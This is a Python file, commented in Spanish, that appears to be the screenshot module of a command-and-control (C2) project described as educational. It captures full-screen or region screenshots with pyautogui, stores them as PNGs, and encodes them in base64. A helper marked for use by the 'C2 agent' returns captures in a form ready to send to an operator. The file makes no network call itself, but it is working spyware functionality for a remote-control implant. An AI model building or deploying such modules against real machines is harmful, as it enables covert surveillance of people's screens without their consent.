"""
Módulo Screenshot - C2 Project
===============================
Captura pantallas remotamente para fines educativos.
USAR ÚNICAMENTE EN ENTORNOS CONTROLADOS Y AUTORIZADOS.
"""

import base64
import os
from datetime import datetime
from io import BytesIO

try:
    import pyautogui
    from PIL import Image
    PYAUTOGUI_AVAILABLE = True
except ImportError:
    PYAUTOGUI_AVAILABLE = False
    print("[!] pyautogui o Pillow no instalados.")
    print("    Ejecuta: pip install pyautogui Pillow")


class Screenshotter:
    """
    Captura pantallas y las guarda/envía en formato base64.
    """
    
    def __init__(self, output_dir: str = 'screenshots'):
        """
        Inicializa el capturador de screenshots.
        
        Args:
            output_dir: Directorio para guardar las capturas
        """
        self.output_dir = output_dir
        self._ensure_dir()
    
    def _ensure_dir(self):
        """Crea el directorio si no existe"""
        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)
    
    def capture(self, filename: str = None) -> str:
        """
        Captura la pantalla y guarda la imagen.
        
        Args:
            filename: Nombre del archivo (opcional, se genera automático si es None)
            
        Returns:
            str: Ruta del archivo guardado
        """
        if not PYAUTOGUI_AVAILABLE:
            raise ImportError("pyautogui o Pillow no disponibles")
        
        # Generar nombre de archivo con timestamp
        if filename is None:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f'screenshot_{timestamp}.png'
        
        filepath = os.path.join(self.output_dir, filename)
        
        # Capturar pantalla
        screenshot = pyautogui.screenshot()
        
        # Guardar imagen
        screenshot.save(filepath)
        print(f"[+] Screenshot guardado: {filepath}")
        
        return filepath
    
    def capture_to_base64(self) -> str:
        """
        Captura la pantalla y retorna en base64.
        
        Returns:
            str: Imagen en formato base64
        """
        if not PYAUTOGUI_AVAILABLE:
            raise ImportError("pyautogui o Pillow no disponibles")
        
        # Capturar pantalla
        screenshot = pyautogui.screenshot()
        
        # Convertir a base64
        buffer = BytesIO()
        screenshot.save(buffer, format='PNG')
        img_base64 = base64.b64encode(buffer.getvalue()).decode('utf-8')
        
        return img_base64
    
    def capture_region(self, x: int, y: int, width: int, height: int, 
                       filename: str = None) -> str:
        """
        Captura una región específica de la pantalla.
        
        Args:
            x, y: Coordenadas de la esquina superior izquierda
            width, height: Dimensiones de la región
            filename: Nombre del archivo (opcional)
            
        Returns:
            str: Ruta del archivo guardado
        """
        if not PYAUTOGUI_AVAILABLE:
            raise ImportError("pyautogui o Pillow no disponibles")
        
        if filename is None:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f'screenshot_region_{timestamp}.png'
        
        filepath = os.path.join(self.output_dir, filename)
        
        # Capturar región específica
        screenshot = pyautogui.screenshot(region=(x, y, width, height))
        screenshot.save(filepath)
        
        print(f"[+] Screenshot de región guardado: {filepath}")
        return filepath
    
    def list_screenshots(self) -> list:
        """
        Lista todos los screenshots capturados.
        
        Returns:
            list: Lista de nombres de archivo
        """
        if not os.path.exists(self.output_dir):
            return []
        
        files = [f for f in os.listdir(self.output_dir) if f.endswith('.png')]
        return sorted(files)
    
    def get_screenshot(self, filename: str) -> bytes:
        """
        Obtiene los datos de un screenshot.
        
        Args:
            filename: Nombre del archivo
            
        Returns:
            bytes: Datos de la imagen
        """
        filepath = os.path.join(self.output_dir, filename)
        if os.path.exists(filepath):
            with open(filepath, 'rb') as f:
                return f.read()
        return b''
    
    def delete_screenshot(self, filename: str) -> bool:
        """
        Elimina un screenshot.
        
        Args:
            filename: Nombre del archivo a eliminar
            
        Returns:
            bool: True si se eliminó, False si no existe
        """
        filepath = os.path.join(self.output_dir, filename)
        if os.path.exists(filepath):
            os.remove(filepath)
            print(f"[+] Screenshot eliminado: {filename}")
            return True
        return False
    
    def clear_all(self):
        """Elimina todos los screenshots"""
        if os.path.exists(self.output_dir):
            for f in os.listdir(self.output_dir):
                if f.endswith('.png'):
                    os.remove(os.path.join(self.output_dir, f))
            print("[+] Todos los screenshots eliminados")


# Función helper para usar en el agente C2
def take_screenshot() -> str:
    """
    Helper para capturar un screenshot.
    
    Returns:
        str: Imagen en base64
    """
    if not PYAUTOGUI_AVAILABLE:
        return "[ERROR] pyautogui o Pillow no disponibles"
    
    try:
        ss = Screenshotter()
        return ss.capture_to_base64()
    except Exception as e:
        return f"[ERROR] {str(e)}"


# Ejemplo de uso
if __name__ == '__main__':
    print("=== Módulo Screenshot ===\n")
    
    if not PYAUTOGUI_AVAILABLE:
        print("[!] pyautogui o Pillow no instalados.")
        print("    Ejecuta: pip install pyautogui Pillow")
        exit(1)
    
    ss = Screenshotter()
    
    # Capturar pantalla completa
    print("[*] Capturando pantalla completa...")
    filepath = ss.capture()
    print(f"[+] Guardado en: {filepath}")
    
    # Capturar en base64
    print("\n[*] Capturando a base64...")
    b64 = ss.capture_to_base64()
    print(f"[+] Base64 length: {len(b64)} caracteres")
    print(f"[+] Primeros 100 chars: {b64[:100]}...")
    
    # Listar screenshots
    print("\n[*] Screenshots disponibles:")
    for f in ss.list_screenshots():
        print(f"  - {f}")
    
    print("\n[+] Módulo screenshot funcionando correctamente!")
